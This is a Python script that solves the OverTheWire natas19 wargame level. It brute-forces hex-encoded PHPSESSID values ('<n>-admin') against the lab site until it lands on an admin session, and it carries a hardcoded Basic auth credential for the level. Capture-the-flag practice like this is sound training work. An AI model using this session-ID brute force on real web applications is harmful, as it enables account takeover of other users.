import requests
import random

base_url ="http://natas19.natas.labs.overthewire.org/index.php?username=admin&password=admin&debug"
auth_headers = {'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='} 

i = 0

tried = []
while True:

    sessid = random.randint(1, 640)
    if(sessid in tried): 
        continue
    tried.append(sessid)

    phpsessid = f"{sessid}-admin".encode("utf-8").hex()
    
    res = requests.get(base_url, headers=auth_headers, 
                        cookies={'PHPSESSID': phpsessid}
                       )


    if("regular" not in res.text):
        print(res.text)
        break
    else:
        i += 1
        try:
            print("Attempt:", i,"--- PHPSESSID =", phpsessid)
        except:
            pass

